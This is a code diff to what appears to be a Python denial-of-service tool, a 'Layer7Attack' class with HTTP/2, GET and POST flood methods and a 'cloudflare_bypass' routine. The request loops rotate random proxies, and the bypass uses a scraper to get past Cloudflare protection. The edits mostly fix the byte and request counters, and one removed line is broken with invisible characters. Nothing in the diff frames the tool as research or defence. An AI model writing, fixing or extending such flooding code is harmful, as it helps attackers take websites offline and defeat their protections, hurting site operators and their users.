@@ -108,7 +108,7 @@ class Layer7Attack(AttackBase):
         self.host = self.parsed.hostname
         self.port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
         methods = {
-            "HTTP2": self.http2_flood,  # Thay HTTP3 bằng HTTP/2 với aiohttp
+            "HTTP2": self.http2_flood,
             "GET": self.http_get,
             "POST": self.http_post,
             "CFB": self.cloudflare_bypass
@@ -158,7 +158,8 @@ class Layer7Attack(AttackBase):
             proxy_url = f"http://{proxy}" if proxy else None
             async with aiohttp.ClientSession() as session:
                 async with session.get(self.target, headers=headers, proxy=proxy_url) as resp:
-                    self.bytes_sent += len(await resp.read())
+                    data = await resp.read()
+                    self.bytes_sent += len(data)
                     self.requests_sent += 1
 
     async def cloudflare_bypass(self):
@@ -167,4 +168,5 @@ class Layer7Attack(AttackBase):
             proxy = random.choice(self.proxies) if self.proxies else None
             proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
             resp = scraper.get(self.target, proxies=proxy_dict)
-            self.bytes_sent +=​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
+            self.bytes_sent += len(resp.request.body or b"")
+            self.requests_sent += 1
